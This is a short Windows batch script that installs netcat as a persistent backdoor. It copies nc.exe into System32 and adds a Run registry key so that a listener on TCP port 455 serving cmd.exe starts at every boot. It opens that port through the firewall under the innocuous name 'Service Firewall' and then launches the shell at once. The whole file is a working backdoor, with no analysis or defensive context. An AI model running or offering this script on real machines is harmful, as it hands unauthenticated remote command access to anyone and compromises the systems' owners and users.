@echo off
echo Installing Netcat...
copy "nc.exe" "C:\windows\system32\nc.exe"
reg add HKLM\software\microsoft\windows\currentversion\run /v nc /t REG_SZ /d "C:\Windows\system32\nc.exe -Ldp 455 -e cmd.exe"
netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL
call start "" "C:\Windows\system32\nc.exe" -Ldp 455 -e cmd.exe
echo Finished!